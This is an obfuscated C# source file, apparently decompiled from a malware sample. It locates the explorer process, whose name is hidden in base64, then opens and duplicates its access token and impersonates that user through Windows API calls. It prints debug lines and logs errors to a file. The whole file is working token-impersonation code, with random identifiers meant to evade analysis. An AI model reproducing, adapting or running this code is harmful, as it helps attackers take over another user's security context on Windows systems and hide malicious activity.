using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Principal;

namespace vQzMGKHeycFziMq;

internal class RcMrhZxbQXKBBGT
{
	public const int VCQUuquMyurfeAYX = 2;

	public const int klqYDBsgbQFS = 8;

	public const int WQIJHysnrnlOG = 4;

	[DllImport("advapi32", SetLastError = true)]
	[SuppressUnmanagedCodeSecurity]
	private static extern int OpenProcessToken(IntPtr vctRxWjxIcCTsI, int CuVbfNGRRYM, ref IntPtr oBUDIuAeSmOx);

	[DllImport("kernel32", SetLastError = true)]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool CloseHandle(IntPtr qIwWxWAhMUwXfUD);

	[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern bool DuplicateToken(IntPtr EHewdiavDrRMZhQw, int nNnRrJXiBHJt, ref IntPtr gSSPAzalOfUR);

	private static IntPtr EsYYRrQRnaMyX(IntPtr KhMSxHLUtIir, int zvurGZZgpOyqy)
	{
		IntPtr gSSPAzalOfUR = IntPtr.Zero;
		DuplicateToken(KhMSxHLUtIir, zvurGZZgpOyqy, ref gSSPAzalOfUR);
		return gSSPAzalOfUR;
	}

	public static void fBZWpzOIMzszQQw()
	{
		try
		{
			IntPtr oBUDIuAeSmOx = IntPtr.Zero;
			IntPtr zero = IntPtr.Zero;
			Process process = null;
			Process[] processes = Process.GetProcesses();
			foreach (Process process2 in processes)
			{
				if (process2.ProcessName == yzZnBHwSsJOOcf.jLGThbkXlozfB("ZXhwbG9yZXI="))
				{
					process = process2;
				}
			}
			if (OpenProcessToken(process.Handle, 14, ref oBUDIuAeSmOx) == 0)
			{
				return;
			}
			WindowsIdentity windowsIdentity = new WindowsIdentity(oBUDIuAeSmOx);
			if (yzZnBHwSsJOOcf.MFBaFacYIYTeS)
			{
				try
				{
					Console.WriteLine("Impersonation-> New Owner: {0}", windowsIdentity.Owner);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				zero = EsYYRrQRnaMyX(oBUDIuAeSmOx, 2);
				_ = IntPtr.Zero == zero;
				windowsIdentity.Impersonate();
				IntPtr token = WindowsIdentity.GetCurrent().Token;
				if (yzZnBHwSsJOOcf.MFBaFacYIYTeS)
				{
					try
					{
						Console.WriteLine("Impersonation-> Token number: {0}", token);
						Console.WriteLine("Impersonation-> Windows ID Name: {0}", WindowsIdentity.GetCurrent().Name);
						return;
					}
					catch (Exception)
					{
						return;
					}
				}
			}
			finally
			{
				CloseHandle(oBUDIuAeSmOx);
			}
		}
		catch (Exception ex3)
		{
			if (yzZnBHwSsJOOcf.dwCcrxocWgDvY)
			{
				try
				{
					File.AppendAllText(yzZnBHwSsJOOcf.HXSuIBiFjcFlYv, "Error while impersonating: " + ex3.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}
}
